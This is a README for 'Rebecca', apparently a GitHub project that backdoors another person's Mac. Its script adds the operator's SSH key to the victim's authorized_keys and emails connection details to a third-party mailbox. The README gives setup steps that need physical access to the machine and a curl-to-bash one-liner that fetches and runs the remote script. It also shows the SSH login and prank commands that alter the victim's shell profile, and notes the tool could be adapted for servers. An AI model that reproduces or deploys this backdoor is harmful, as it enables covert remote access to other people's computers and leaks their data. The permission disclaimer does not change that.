# Rebecca

Rebecca gives you access to another user's Mac. Running this script injects SSH key into the victim's Mac thus giving remote access.

**_I HIGHLY RECOMMEND GETTING PERMISSION FROM THE USER FIRST_**

Rebecca consist of two scripts, one to add rsa public key into the authorized_keys of the user's Mac and email relevant information for SSH to a third party mailbox. The other to remove rsa public key from the authorized_keys of the user's Mac.

## Use Case

Rebecca could be modified to easily get SSH access to servers, but its current use is really just to troll people.

With SSH access, one can make a mac talk to the user, launch random browsers, sleep the Mac, etc. Some interesting commands to play with:

```
say -v veena hello world
open "http://google.com"
pmset sleepnow
echo "alias ls='say -v veena hello, why are you touching me'" >> ~/.bash_profile
```

## Installtion Steps

1. You will want to clone this to your own github respository.
2. You will want to create a rsa key pair if you don't have one.
3. Change the rsa public key in `rebecca.sh` to your own rsa public key.
4. Change the third party mailbox in `rebecca.sh` to your own mailbox.
5. Change identifier in `purge.sh` to your identifier otherwise `purge.sh` will not work.
6. You will need physical access to a users Mac with remote login turned on.

## Commands

- `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/rebecca.sh)`

  Runs rebecca script which basically injects your SSH key into the user's Mac authorized_keys, grabs relevant information and send it out to a mail server.

- `ssh -i <private_rsa_key_file> <hostname>@<ip address>`

  SSH into the user's Mac, get the relevant information from the mail server.

- `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/purge.sh)`

  Runs purge script which removes your SSH key from the user's Mac authorized_keys.

## Credits

Thanks to Ryan Tan and Ken Chuan for this interesting idea and guidance, as well as all who have given me permission to experiment on their laptops.
